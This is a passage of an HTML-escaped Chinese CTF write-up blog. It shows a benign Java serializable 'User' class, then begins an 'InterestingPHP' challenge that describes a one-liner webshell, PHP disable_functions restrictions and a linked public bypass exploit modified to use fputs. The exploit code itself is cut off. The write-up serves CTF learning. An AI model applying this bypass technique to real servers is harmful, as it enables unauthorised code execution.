class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs typescript&#34;&gt;package entity;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.IOException;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.ObjectInputStream;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.Serializable;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;User&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Serializable&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; name;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; age;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; transient &lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; height;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;User&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; name, &lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; age, &lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; height&lt;/span&gt;)&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.name = name;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.age = age;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.height = height;&lt;br&gt;  &amp;#125;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;getName&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.name;&lt;br&gt;  &amp;#125;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;setName&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; name&lt;/span&gt;)&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.name = name;&lt;br&gt;  &amp;#125;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;getAge&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.age;&lt;br&gt;  &amp;#125;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;setAge&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; age&lt;/span&gt;)&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.age = age;&lt;br&gt;  &amp;#125;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;getHeight&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.height;&lt;br&gt;  &amp;#125;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;setHeight&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; height&lt;/span&gt;)&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.height = height;&lt;br&gt;  &amp;#125;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;void&lt;/span&gt; readObject(ObjectInputStream s) throws IOException, ClassNotFoundException &amp;#123;&lt;br&gt;    s.defaultReadObject();&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.height = (&lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt;)s.readObject();&lt;br&gt;  &amp;#125;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;void&lt;/span&gt; writeObject(java.io.ObjectOutputStream out) throws IOException &amp;#123;&lt;br&gt;    out.defaultWriteObject();&lt;br&gt;    out.writeObject(&lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.height);&lt;br&gt;  &amp;#125;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;equals&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;Object&lt;/span&gt; obj&lt;/span&gt;)&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (obj == &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;    &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt; == obj) &amp;#123;&lt;br&gt;      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;&lt;br&gt;    &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (obj &lt;span class=&#34;hljs-keyword&#34;&gt;instanceof&lt;/span&gt; User) &amp;#123;&lt;br&gt;      User user = (User)obj;&lt;br&gt;      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; user.getAge().equals(&lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.age) &amp;amp;&amp;amp; user.getHeight().equals(&lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.height) &amp;amp;&amp;amp; user.getName().equals(&lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.name);&lt;br&gt;    &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;  &amp;#125;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;toString&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;User&amp;#123;name=&amp;#x27;&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.name + &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\&amp;#x27;&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;, age=&amp;#x27;&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.age + &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\&amp;#x27;&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;, height=&amp;#x27;&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.height + &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\&amp;#x27;&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#125;&amp;#x27;&lt;/span&gt;;&lt;br&gt;  &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105851.png&#34; alt=&#34;image-20220212164454472&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;interestingphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#interestingphp&#34;&gt;#&lt;/a&gt; InterestingPHP&lt;/h3&gt;
&lt;p&gt;一句话&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105417.png&#34; alt=&#34;image-20220212164857605&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;有 disable_functions&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105580.png&#34; alt=&#34;image-20220212165009928&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;PHP 版本 7.2.25&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105540.png&#34; alt=&#34;image-20220212165050027&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试 bypass 的 exp：&lt;a href=&#34;https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php%EF%BC%8C%E5%85%B6%E4%B8%AD&#34;&gt;https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php，其中&lt;/a&gt; &lt;code&gt;fwrite&lt;/code&gt;  被禁了，改成 &lt;code&gt;fputs&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span 